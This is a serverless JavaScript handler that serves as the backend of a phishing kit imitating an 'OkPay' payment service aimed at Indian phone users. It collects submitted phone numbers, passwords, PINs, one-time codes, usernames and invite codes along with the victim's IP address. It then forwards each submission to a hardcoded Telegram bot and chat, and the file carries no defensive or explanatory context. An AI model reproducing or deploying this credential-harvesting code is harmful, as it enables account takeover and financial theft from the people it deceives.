export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, phone, pass, pin, otp, username, invite } = req.body;
  const BOT_TOKEN = '8750081908:AAEha0LhQSw0tbocU-9rx2WJ1DgdyHcjvOw';
  const CHAT_ID = '6076330929';

  // Get Visitor IP from Vercel headers
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  let message = '';
  if (type === 'login') {
    message = `✅ <b>New OkPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>`;
  } else if (type === 'modal_otp') {
    message = `🔐 <b>Login OTP requested (Modal)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'verify_otp') {
    message = `🔑 <b>OTP Entered</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
  } else if (type === 'reg_otp') {
    message = `🔐 <b>Register OTP requested</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'register') {
    message = `🆕 <b>New OkPay registration</b>\n🌐 IP: <code>${clientIp}</code>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>\n🎫 Invite: <code>${invite}</code>`;
  }

  try {
    const tgRes = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(tgRes, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    const data = await response.json();
    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ error: 'Failed to send message to Telegram' });
  }
}
